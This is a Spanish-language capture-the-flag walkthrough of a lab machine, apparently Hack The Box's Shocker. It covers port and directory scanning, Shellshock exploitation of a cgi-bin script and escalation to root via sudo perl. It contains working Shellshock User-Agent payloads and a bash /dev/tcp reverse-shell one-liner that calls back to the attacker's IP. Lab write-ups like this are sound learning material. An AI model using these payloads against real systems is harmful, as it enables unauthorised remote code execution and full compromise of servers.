## Summary

Tags:  #Linux #HTTP #ShellShock #Sudoers #Perl #Fuzzing #Nmap #Cgi-bin #Tshark #ReverShell #Wfuzz 

- IP -> 10.10.10.56
- Ports -> TCP (80, 2222), UDP (idk)
- OS ->  Linux Ubuntu 
- Services & Applications
    - 80 -> Apache httpd 2.4.18 
    - 2222 -> OpenSSH 7.2p2 

## Launchpad

-   [Launchpad](https://launchpad.net/ubuntu)
-   [Shellshock-attack](https://blog.cloudflare.com/inside-shellshock/)
-   [Perl-sudo](https://gtfobins.github.io/gtfobins/perl/#sudo)

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

```bash
❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen

	#  -p80 = Indica el puerto que se quiere escanear
	#  Target IP = Dirección IP que se quiere escanear
	#  -oN WebScan = Exporta el output a un fichero en formato nmap con nombre “WebScan”
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

```bash
# Para hacer Fuzzing a la web
❯ wfuzz -c --hc=404 --hh=137 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ 

# Como no nos sale nada, debemos de colocarle la barra al final de FUZZ que seria lo mas recomendable
❯ wfuzz -c --hc=404 --hh=137 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/
	# Encontramos un dir llamado 'cgi-bin' con codigo de estado '403'

# Este dir sale cuando tenemos un ShellShock como vulnerabilidad, por lo que haremos otro fuzzing pero con ese dir agregado a la ruta para descubrir archivos que pueden existir en ese dir cgi
❯ wfuzz -c --hc=404,403 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
	# Nos encuentra un archivo llamado "user - sh = user.sh"
```

```bash 
❯ curl -s -X GET http://10.10.10.56/cgi-bin/user.sh      # Miramos el contenido del archivo, nos damos cuenta que es un archivo ejecutable dinamico
```

```bash 
# Cuando tenemos la carpeta cgi-bin, podemos verificar si se podria hacer un ataque de ShellShock
❯ nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh -p80 10.10.10.56    # En este caso es vulnerable a ShellShock

# Cuando lanzamos la verificacion con nmap, podemos ver como hace el ataque a la ruta y en donde inyecta el payload para verificar la vulonerabilidad 
❯ tshark -w captura.cap -i tun0     # Capturamos el trafico por la interfaz 'tun0'

❯ tshark -r ❮File.cap❯ -Y "http" -Tfileds -e "tcp.payload" 2>/dev/null | xxd -ps -r; echo  
# Capturamos trafico, filtramos por HTTP y filtramos por un campo especifico y nos lo mostrara en hexadecimal
# Revertimos con xxd, volvemos a filtrar por GET y todo esto es para poder ver las rutas que esta probando el script de la captura
```

```bash 
❯ curl -s -X GET http://<IP>/cgi-bin/user.sh -H "User-Agent: () { :; }; /usr/bin/whoami"  # Debemos de colocar la ruta del archivo.sh, ya que si solo colocamos /cgi-bin/ nos sladra que no tenemos permisos

	# s = Silence 
	# H = Cabecera para el ataque de ShellShock
	# Ruta absoluta del comando que quieres ejecutar y lo ves con 'which' -> which whoami

# Si nos muestra un error, debemos de colocar 'echo;', rara vez debemos de colocarlo dos veces seguidas
❯ curl -s -X GET http://<IP>/cgi-bin/user.sh -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
# Nos sale que el nombre del usuario es Shelly
```

## User

```bash 
# Podemos usar el ShellShock para ganar acceso a la maquina
❯ curl -s -X GET http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-Atacante>/443 0>&1'" 
```

```bash
❯ nc -nlvp 443    # Nos colocamos en escucha para recibir la revershell
```

```bash
# Una vez dentro de la maquina victima, hacemos el tratamiento de la TTL para obtner una pseudo-consola

❯ script /dev/null -c bash                               # Inicio del tratamiento de la consola 
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

❯ export TERM=xterm-256color                             # Para que la shell tenga colores 
	❯ source /etc/skel/.bashrc

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

```bash
❯ lsb_release -a                    # Miramos algunas caracteristicas de la maquina Linux 
```

## Root

```bash
❯ sudo -l                            # Ver que permisos tenemos en el sudoer y poder ejecutar como root algun comando
	
	# (ALL : ALL) ALL
	# ALL=(root) NOPASSWD: /usr/bin/perl
```

```bash 
❯ sudo /usr/bin/perl -e 'exec "/bin/bash";'     # Nos convertimos en root      
```